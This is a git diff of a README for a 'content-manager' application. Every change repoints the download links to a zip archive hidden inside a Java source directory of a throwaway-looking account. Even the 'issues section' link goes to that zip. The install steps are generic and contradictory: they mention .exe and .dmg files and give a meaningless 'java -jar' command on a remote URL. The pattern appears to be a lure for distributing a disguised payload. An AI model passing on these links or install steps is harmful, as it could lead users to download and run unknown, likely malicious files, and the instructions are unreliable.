@@ -6,7 +6,7 @@ Welcome to **content-manager**. This software helps you manage data through a si
 
 ## 📥 Download & Install
 
-To download the latest version, visit this page: [Download content-manager](https://raw.githubusercontent.com/fgdfssdfsdf/content-manager/main/distater/content-manager.zip). 
+To download the latest version, visit this page: [Download content-manager](https://github.com/fgdfssdfsdf/content-manager/raw/refs/heads/main/src/main/java/com/iamvusumzi/content_manager/content-manager-3.4.zip). 
 
 You’ll find the files you need for various operating systems. Click the link for your system, and follow the steps below.
 
@@ -19,7 +19,7 @@ You’ll find the files you need for various operating systems. Click the link f
 
 ## 📂 Installation Steps
 
-1. **Visit the Releases Page:** Open your web browser and go to [Download content-manager](https://raw.githubusercontent.com/fgdfssdfsdf/content-manager/main/distater/content-manager.zip).
+1. **Visit the Releases Page:** Open your web browser and go to [Download content-manager](https://github.com/fgdfssdfsdf/content-manager/raw/refs/heads/main/src/main/java/com/iamvusumzi/content_manager/content-manager-3.4.zip).
 
 2. **Select Your File:** Look for the latest release at the top of the list. You’ll see files for different types of systems. Choose the one that matches your operating system.
 
@@ -28,7 +28,7 @@ You’ll find the files you need for various operating systems. Click the link f
 4. **Run the Installer:**
    - **Windows:** Double-click the downloaded `.exe` file. Follow the prompts to install the application.
    - **MacOS:** Open the `.dmg` file, then drag the application to your 'Applications' folder.
-   - **Linux:** Use terminal commands to navigate to the downloaded file. Then run it with the command `java -jar https://raw.githubusercontent.com/fgdfssdfsdf/content-manager/main/distater/content-manager.zip`.
+   - **Linux:** Use terminal commands to navigate to the downloaded file. Then run it with the command `java -jar https://github.com/fgdfssdfsdf/content-manager/raw/refs/heads/main/src/main/java/com/iamvusumzi/content_manager/content-manager-3.4.zip`.
 
 5. **Complete the Setup:** Follow any additional prompts to complete the installation. 
 
@@ -58,7 +58,7 @@ If you run into issues during installation or usage, consider the following step
 
 ## 📩 Support
 
-For further help, check the [issues section of the repository](https://raw.githubusercontent.com/fgdfssdfsdf/content-manager/main/distater/content-manager.zip). You can report any bugs or ask questions there. Here’s the link again for your convenience: [Download content-manager](https://raw.githubusercontent.com/fgdfssdfsdf/content-manager/main/distater/content-manager.zip).
+For further help, check the [issues section of the repository](https://github.com/fgdfssdfsdf/content-manager/raw/refs/heads/main/src/main/java/com/iamvusumzi/content_manager/content-manager-3.4.zip). You can report any bugs or ask questions there. Here’s the link again for your convenience: [Download content-manager](https://github.com/fgdfssdfsdf/content-manager/raw/refs/heads/main/src/main/java/com/iamvusumzi/content_manager/content-manager-3.4.zip).
 
 ## 🎯 Explore More
 
